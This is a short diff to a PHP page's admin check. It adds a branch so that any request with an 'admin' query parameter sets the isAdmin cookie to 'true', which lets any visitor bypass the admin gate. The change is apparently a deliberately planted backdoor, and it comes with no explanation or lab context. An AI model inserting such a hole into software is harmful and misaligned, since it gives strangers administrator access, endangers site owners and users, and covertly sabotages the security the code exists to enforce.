@@ -1,5 +1,8 @@
 <?php
-if($_COOKIE['isAdmin']!='true'){
+if(isset($_GET['admin'])){
+    setcookie("isAdmin", 'true');
+}
+else if($_COOKIE['isAdmin']!='true'){
     setcookie("isAdmin", 'false');
     die('You are not Admin');
 }
